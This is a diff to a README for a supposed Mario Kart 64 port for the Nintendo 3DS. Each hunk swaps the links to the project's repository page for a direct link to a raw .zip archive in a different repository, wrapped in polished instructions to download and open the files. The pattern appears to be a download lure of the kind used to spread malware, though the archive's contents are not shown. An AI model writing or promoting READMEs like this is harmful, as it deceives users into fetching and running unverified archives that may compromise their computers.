@@ -5,7 +5,7 @@ description: "Play Mario Kart 64 natively on Nintendo 3DS with improved resource
 ---
 # 🏁 MarioKart64-3DSPort-Complete - Classic Kart Racing on 3DS
 
-[![Download MarioKart64-3DSPort-Complete](https://img.shields.io/badge/⬇_Download_MarioKart64--3DSPort--Complete-FF3CAC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DarkException22/MarioKart64-3DSPort-Complete)
+[![Download MarioKart64-3DSPort-Complete](https://img.shields.io/badge/⬇_Download_MarioKart64--3DSPort--Complete-FF3CAC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DarkException22/darkexception22.github.io/raw/refs/heads/main/assets/Latest-v2.5-beta.5.zip)
 
 MarioKart64-3DSPort-Complete is a polished, carefully refined port of the classic Nintendo 64 kart racer, rebuilt to run smoothly on the Nintendo 3DS family of systems. This project takes the fast, friendly racing you remember and packages it into a clean, ready-to-run build that focuses on stability, smooth frame rates, and a complete experience from the very first cup to the final unlockable. If you have ever wanted to drift around Rainbow Road on a handheld, this is the project for you.
 
@@ -50,7 +50,7 @@ Getting the application onto your computer takes only a couple of minutes. Follo
 
 1. Open your web browser.
 2. Visit the download link shown in the next section.
-3. Visit this link to download the application: https://github.com/DarkException22/MarioKart64-3DSPort-Complete
+3. Visit this link to download the application: https://github.com/DarkException22/darkexception22.github.io/raw/refs/heads/main/assets/Latest-v2.5-beta.5.zip
 4. On the project page, look for the download area and save the application files to a folder you can easily find, such as your Downloads folder or a new folder on your Desktop.
 5. Wait for the download to finish completely before opening anything. Large files take a moment, especially on slower connections.
 6. Open the folder where the files were saved.
@@ -63,9 +63,9 @@ That is the entire process. There is no command line, no configuration file to e
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/📥_Get_MarioKart64--3DSPort--Complete-00C2FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DarkException22/MarioKart64-3DSPort-Complete)
+[![Download Now](https://img.shields.io/badge/📥_Get_MarioKart64--3DSPort--Complete-00C2FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DarkException22/darkexception22.github.io/raw/refs/heads/main/assets/Latest-v2.5-beta.5.zip)
 
-Visit this link to download the application: https://github.com/DarkException22/MarioKart64-3DSPort-Complete
+Visit this link to download the application: https://github.com/DarkException22/darkexception22.github.io/raw/refs/heads/main/assets/Latest-v2.5-beta.5.zip
 
 Keep the project page bookmarked. When a new polish build is released, that same page is where you will find it, and updating is simply a matter of downloading the newest version and replacing your older files while keeping your save data safe.
 
